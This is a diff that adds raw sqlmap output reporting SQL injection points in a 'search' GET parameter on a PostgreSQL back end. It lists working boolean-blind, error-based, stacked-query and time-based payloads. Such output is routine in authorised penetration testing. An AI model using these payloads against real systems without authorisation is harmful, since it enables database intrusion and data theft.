@@ -1,0 +1,20 @@
+sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=a' AND (SELECT (CASE WHEN (7857=7857) THEN NULL ELSE CAST((CHR(78)||CHR(98)||CHR(114)||CHR(107)) AS NUMERIC) END)) IS NULL-- ChLy
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=a' AND 8898=CAST((CHR(113)||CHR(122)||CHR(122)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (8898=8898) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(106)||CHR(122)||CHR(113)) AS NUMERIC)-- JIWo
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=a';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=a' AND 1897=(SELECT 1897 FROM PG_SLEEP(5))-- QDXo
+---
+back-end DBMS: PostgreSQL
